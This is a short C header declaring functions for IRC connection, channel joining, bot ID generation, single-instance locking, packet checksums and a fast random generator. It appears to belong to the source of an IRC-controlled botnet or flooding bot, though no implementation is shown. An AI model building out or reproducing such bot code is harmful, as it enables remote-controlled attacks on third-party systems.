#include "includes.h"

int irc_connect(const char *, int);
void send_irc_command(int, const char *);
void join_channel(int, const char *);
char *generate_bot_id(void);
int ensure_single_instance(void);
void strip_string(char*);
char compare_val(char *, int, char *, int);

unsigned short csum(unsigned short *buf, int count);
unsigned long int rand_cmwc(void);
ipv4_t util_local_addr(void);
